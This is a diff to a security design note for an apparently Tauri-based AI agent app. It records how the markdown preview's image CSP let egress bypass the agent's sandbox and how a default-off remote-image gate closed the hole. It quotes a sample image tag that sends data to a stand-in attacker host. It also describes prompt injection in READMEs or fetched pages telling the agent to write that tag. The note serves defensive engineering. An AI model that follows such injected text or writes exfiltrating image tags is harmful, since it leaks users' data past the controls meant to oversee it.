@@ -33,29 +33,34 @@ The seatbelt + CONNECT proxy cage the **agent process**. They do not cage the
 **webview**, which makes its own network requests as the app itself. Anything
 the webview can be made to fetch is egress the proxy allowlist never sees.
 
-There is one such path today, accepted deliberately (#65): `img-src` in
-`tauri.conf.json` allows any `https:` origin, so the markdown preview renders
-remote images. Previewing
+There was one such path (#65): `img-src` in `tauri.conf.json` allows any
+`https:` origin, so the markdown preview could render remote images.
+Previewing
 
 ```markdown
 ![](https://attacker.example/x.png?d=<data>)
 ```
 
-fires a GET to an arbitrary host on render, with no click and no prompt, even
-when the workspace is in `Enforce` and the agent itself cannot reach that host.
+used to fire a GET to an arbitrary host on render, with no click and no
+prompt, even when the task is in `Enforce` and the agent itself cannot reach
+that host.
 
-The realistic trigger is not a scheming agent, it is **prompt injection plus
-untrusted markdown**. An agent reads a dependency's README, a GitHub issue, or a
-fetched page, and that text tells it to write the image tag. The same applies to
-markdown the agent never touched: a contributor's fork, a submodule, a vendored
-package. Only a GET is possible (no script: `script-src 'self'`, markdown-it runs
-with `html:false` and blocks `javascript:`), so the payload is limited to what
-the markdown's author can encode in a URL, plus the viewer's IP, user-agent, and
-timing. GitHub and VS Code make the same tradeoff for their previews.
+The realistic trigger was never a scheming agent, it's **prompt injection
+plus untrusted markdown**. An agent reads a dependency's README, a GitHub
+issue, or a fetched page, and that text tells it to write the image tag. The
+same applies to markdown the agent never touched: a contributor's fork, a
+submodule, a vendored package. Only a GET was ever possible (no script:
+`script-src 'self'`, markdown-it runs with `html:false` and blocks
+`javascript:`), so the payload was limited to what the markdown's author
+could encode in a URL, plus the viewer's IP, user-agent, and timing. GitHub
+and VS Code make the same tradeoff for their previews, but not on by default.
 
-If this ever needs closing, the shape is a default-off "load remote images"
-preference gating hydration (tracked in #69), not a CSP tweak: Tauri's CSP is
-one policy for the whole webview and cannot be scoped to a component.
+Closed in #69: `gateRemoteImages()` in `MarkdownPreview.tsx` intercepts every
+`http(s):` `<img>` src before it ever reaches the DOM's `src` attribute,
+gated on a default-OFF `loadRemoteImages` pref (Settings → General) or a
+per-tab override set from the preview's own "blocked images" banner. The CSP
+itself is unchanged, still allows `https:` in `img-src` — this is a renderer
+gate, not a CSP tweak, per the note below.
 
 **Before widening the CSP again, remember it is app-wide.** `connect-src` or
 `script-src` would be materially worse than `img-src` is.
